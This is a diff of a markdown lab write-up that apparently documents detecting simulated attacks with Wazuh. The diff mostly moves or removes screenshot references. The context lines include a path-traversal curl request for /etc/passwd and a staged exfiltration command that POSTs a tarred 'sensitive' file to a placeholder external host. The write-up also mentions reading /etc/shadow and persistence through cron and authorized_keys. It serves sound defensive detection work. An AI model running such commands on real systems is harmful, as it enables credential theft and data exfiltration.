@@ -77,24 +77,12 @@ curl "http://192.168.56.20/../../../../etc/passwd"
 <!-- 📸 Screenshot: Nginx access log showing the suspicious probing requests -->
 ![Nginx suspicious requests](./screenshots/03-web-attack/01-nginx-suspicious-requests.png)
 
-<!-- 📸 Screenshot: Wazuh filtered on source IP for the web probing events -->
-![Wazuh source IP web events](./screenshots/03-web-attack/02-wazuh-srcip-web-events.png)
-
-<!-- 📸 Screenshot: Wazuh search isolating the SQL injection payload pattern -->
-![Wazuh SQL injection pattern search](./screenshots/03-web-attack/03-wazuh-sql-pattern-search.png)
-
-<!-- 📸 Screenshot: Wazuh search isolating the XSS payload pattern -->
-![Wazuh XSS pattern search](./screenshots/03-web-attack/04-wazuh-xss-pattern-search.png)
-
-<!-- 📸 Screenshot: Wazuh search for requests to sensitive paths (/wp-admin, /phpmyadmin, /.env) -->
-![Wazuh sensitive path requests](./screenshots/03-web-attack/05-wazuh-sensitive-paths.png)
-
-<!-- 📸 Screenshot: Wazuh rule detail for the web server error rule -->
-![Wazuh web rule details](./screenshots/03-web-attack/06-wazuh-web-rule-details.png)
-
 Almost all of these came back as 404s, since none of those paths or applications actually exist on this server. That's worth calling out directly: a 404 is not a non-event. It's still evidence that someone is actively fingerprinting your application surface, and a cluster of them from one source IP, hitting known-sensitive paths in a short window, is a meaningful signal on its own — long before any request actually succeeds.
 
 In Wazuh, filtering on the source IP and Nginx logs surfaced the requested URLs, response codes, and rule descriptions tied to web server errors.
+
+<!-- 📸 Screenshot: Wazuh rule detail for the web server error rule -->
+![Wazuh web rule details](./screenshots/03-web-attack/06-wazuh-web-rule-details.png)
 
 **MITRE ATT&CK techniques observed:**
 - `T1190` — Exploit Public-Facing Application
@@ -113,21 +101,12 @@ systemctl status
 <!-- 📸 Screenshot: local auth.log entries showing the sudo commands executed -->
 ![Local auth.log sudo commands](./screenshots/04-suspicious-command/01-local-authlog-sudo-commands.png)
 
-<!-- 📸 Screenshot: Wazuh sudo command events -->
-![Wazuh sudo events](./screenshots/04-suspicious-command/02-wazuh-sudo-events.png)
-
-<!-- 📸 Screenshot: Wazuh alert for the /etc/shadow read attempt -->
-![Wazuh shadow file command alert](./screenshots/04-suspicious-command/03-wazuh-shadow-command.png)
-
-<!-- 📸 Screenshot: Wazuh alert for the systemctl status command -->
-![Wazuh systemctl command alert](./screenshots/04-suspicious-command/04-wazuh-systemctl-command.png)
-
-<!-- 📸 Screenshot: Wazuh event detail showing the full command field -->
-![Wazuh command field details](./screenshots/04-suspicious-command/05-wazuh-command-field-details.png)
-
 None of these are malicious in isolation. Every one of them is something a legitimate admin runs regularly. What made them worth flagging in this context was the combination and the sequence: privilege enumeration, followed by network reconnaissance, following directly after a brute-force and a round of web probing from the same source.
 
 Wazuh's sudo logging and command auditing surfaced these as discrete events, each mapped individually to MITRE ATT&CK.
+
+<!-- 📸 Screenshot: Wazuh sudo command events -->
+![Wazuh sudo events](./screenshots/04-suspicious-command/02-wazuh-sudo-events.png)
 
 **MITRE ATT&CK techniques observed:**
 - `T1548.003` — Sudo and Sudo Caching
@@ -139,18 +118,6 @@ Wazuh's sudo logging and command auditing surfaced these as discrete events, eac
 ### Detecting Persistence
 
 This stage is where Wazuh's FIM module did the most work. I simulated three common persistence techniques: adding a cron job under `/etc/cron.d/`, appending an SSH key to an `authorized_keys` file, and dropping a hidden file in `/tmp`.
-
-<!-- 📸 Screenshot: local view of the persistence artifacts created (cron entry, authorized_keys, hidden file) -->
-![Local persistence artifacts](./screenshots/05-persistence/01-local-persistence-artifacts.png)
-
-<!-- 📸 Screenshot: Wazuh alert for the cron persistence command -->
-![Wazuh cron sudo command](./screenshots/05-persistence/02-wazuh-cron-sudo-command.png)
-
-<!-- 📸 Screenshot: Wazuh syscheck (FIM) search results -->
-![Wazuh syscheck search](./screenshots/05-persistence/03-wazuh-syscheck-search.png)
-
-<!-- 📸 Screenshot: Wazuh search for authorized_keys events -->
-![Wazuh authorized_keys search](./screenshots/05-persistence/04-wazuh-authorized-keys-search.png)
 
 <!-- 📸 Screenshot: Wazuh FIM alert showing the authorized_keys diff -->
 ![Wazuh authorized_keys FIM event](./screenshots/05-persistence/05-wazuh-authorized-keys-fim-event.png)
@@ -173,31 +140,13 @@ tar -czf staged_data.tar.gz sensitive_file.txt
 curl -X POST -F "file=@staged_data.tar.gz" http://<external-host>/upload
 ```
 
-<!-- 📸 Screenshot: local commands run for the exfiltration simulation -->
-![Local exfiltration simulation commands](./screenshots/06-exfiltration/01-local-exfiltration-simulation-commands.png)
-
-<!-- 📸 Screenshot: the fake sensitive file created for staging -->
-![Fake sensitive file created](./screenshots/06-exfiltration/02-fake-sensitive-file-created.png)
-
 <!-- 📸 Screenshot: staging folder with the compressed archive -->
 ![Staging folder archive created](./screenshots/06-exfiltration/03-staging-folder-archive-created.png)
 
-<!-- 📸 Screenshot: local auth.log entries tied to the exfiltration commands -->
-![Local auth.log exfiltration commands](./screenshots/06-exfiltration/04-local-authlog-exfiltration-commands.png)
-
-<!-- 📸 Screenshot: Wazuh search for the staged sensitive file name -->
-![Wazuh sensitive file search](./screenshots/06-exfiltration/05-wazuh-customers-csv-search.png)
-
-<!-- 📸 Screenshot: Wazuh search for staging-directory activity -->
-![Wazuh staging search](./screenshots/06-exfiltration/06-wazuh-staging-search.png)
-
-<!-- 📸 Screenshot: Wazuh search for the tar/compression command -->
-![Wazuh tar command search](./screenshots/06-exfiltration/07-wazuh-tar-command-search.png)
+The exfiltration attempt itself failed — there was no receiving server on the other end, so the POST request simply errored out. That's fine, and worth stating plainly rather than glossing over: the goal of this stage wasn't a successful exfiltration, it was generating the telemetry that precedes one. The staging, compression, and outbound transfer attempt are themselves the detectable behaviors, regardless of whether the transfer completes.
 
 <!-- 📸 Screenshot: Wazuh event for the curl outbound transfer attempt -->
 ![Wazuh curl transfer attempt](./screenshots/06-exfiltration/08-wazuh-curl-transfer-attempt.png)
-
-The exfiltration attempt itself failed — there was no receiving server on the other end, so the POST request simply errored out. That's fine, and worth stating plainly rather than glossing over: the goal of this stage wasn't a successful exfiltration, it was generating the telemetry that precedes one. The staging, compression, and outbound transfer attempt are themselves the detectable behaviors, regardless of whether the transfer completes.
 
 **MITRE ATT&CK techniques observed:**
 - `T1005` — Data from Local System
@@ -212,24 +161,6 @@ This is the part that ties the whole project together, and it's the part that ma
 Look at the very first alert in this whole chain: the Nmap scan from Part 1. In isolation, that alert is Low severity — scans happen constantly, including from legitimate vulnerability management tools. But once you place it at the start of a sequence that includes an SSH brute-force, web probing against sensitive paths, privilege enumeration, a persistence mechanism, and a staged data transfer, all from the same source IP within a short window, that same Low-severity scan retroactively becomes part of a High or Critical incident.
 
 Severity, in other words, isn't a fixed property of an alert type. It's a property of the story the alerts tell together. A SOC that triages each alert independently and closes them individually would miss the chain entirely. A SOC that correlates by source IP, time window, and technique progression catches the actual incident.
-
-<!-- 📸 Screenshot: reconnaissance detection revisited in the chain view -->
-![Reconnaissance detection](./screenshots/07-attack-chain/01-reconnaissance-wazuh-detection.png)
-
-<!-- 📸 Screenshot: SSH brute-force detection revisited in the chain view -->
-![SSH brute-force detection](./screenshots/07-attack-chain/02-ssh-bruteforce-wazuh-detection.png)
-
-<!-- 📸 Screenshot: web attack detection revisited in the chain view -->
-![Web attack detection](./screenshots/07-attack-chain/03-web-attack-wazuh-detection.png)
-
-<!-- 📸 Screenshot: suspicious sudo commands revisited in the chain view -->
-![Suspicious sudo commands](./screenshots/07-attack-chain/04-suspicious-sudo-commands.png)
-
-<!-- 📸 Screenshot: persistence (authorized_keys modification) revisited in the chain view -->
-![Persistence authorized_keys modification](./screenshots/07-attack-chain/05-persistence-authorized-keys-modification.png)
-
-<!-- 📸 Screenshot: exfiltration staging and transfer attempt revisited in the chain view -->
-![Exfiltration staging and transfer attempt](./screenshots/07-attack-chain/06-exfiltration-staging-and-transfer-attempt.png)
 
 **Attack chain summary:**
 
